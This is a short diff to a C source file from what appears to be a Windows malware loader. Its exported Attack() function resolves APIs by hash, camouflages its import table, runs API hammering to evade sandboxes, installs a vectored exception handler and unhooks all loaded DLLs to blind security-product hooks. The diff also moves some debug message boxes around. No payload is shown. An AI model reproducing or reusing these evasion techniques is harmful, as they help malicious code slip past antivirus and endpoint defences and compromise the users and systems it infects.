@@ -25,21 +25,26 @@ extern __declspec(dllexport) int Attack()
 
     IatCamouflage();
 
-    MessageBoxA(NULL, "Hello", "Hello", MB_OK);
-
     fnAddVectoredExceptionHandler        pAddVectoredExceptionHandler     = (fnAddVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_JOAA), AddVectoredExceptionHandler_JOAA);
     fnRemoveVectoredExceptionHandler     pRemoveVectoredExceptionHandler  = (fnRemoveVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_JOAA), RemoveVectoredExceptionHandler_JOAA);
 
+    ApiHammering(1000);
+
     if (!pAddVectoredExceptionHandler || !pRemoveVectoredExceptionHandler)
     {
+        MessageBoxA(NULL, "ERROR", "ERROR", MB_OK);
         return -1;
     }
+
+    MessageBoxA(NULL, "Hello", "Hello", MB_OK);
 
     pVehHandler = pAddVectoredExceptionHandler(1, VectoredExceptionHandler);
     if (pVehHandler == NULL)
         return -1;
 
     UnhookAllLoadedDlls();
+
+    MessageBoxA(NULL, "Hello", "Hello", MB_OK);
 
     if (!pRemoveVectoredExceptionHandler(pVehHandler))
         return -1;
